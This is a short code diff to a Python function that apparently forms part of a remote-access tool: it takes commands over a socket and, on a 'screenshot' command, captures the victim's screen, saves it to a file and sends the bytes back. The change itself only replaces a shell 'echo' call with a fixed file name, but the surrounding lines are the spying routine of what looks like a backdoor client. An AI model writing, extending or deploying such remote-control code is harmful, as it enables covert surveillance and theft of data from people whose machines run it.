@@ -84,8 +84,7 @@ def connection():
             s.send(response)
         elif cmd == "screenshot":
             myScreenshot = screenshot()
-            path = Popen("echo shot.png", stdout=PIPE, shell=True).stdout.read().replace(
-                "\n", "").replace("\r", "")
+            path = "shot.png"
             myScreenshot.save(path)
             with open(path, "rb") as f:
                 response = f.read()
